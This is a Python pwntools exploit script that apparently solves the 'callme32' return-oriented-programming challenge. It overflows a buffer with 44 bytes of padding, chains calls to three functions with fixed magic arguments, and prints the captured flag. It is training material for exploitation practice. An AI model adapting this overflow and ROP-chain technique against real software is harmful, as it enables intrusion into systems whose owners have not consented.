from pwn import *
import warnings

exe = './callme32'
elf = context.binary = ELF(exe, checksec=False)
warnings.filterwarnings('ignore')

io = process()

padding  = "A" * 44
params = [
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d
]

rop = ROP(elf)
rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)

chain = rop.chain()

payload = flat([
    padding,
    chain
])

io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

flag = io.recv()
success(flag)
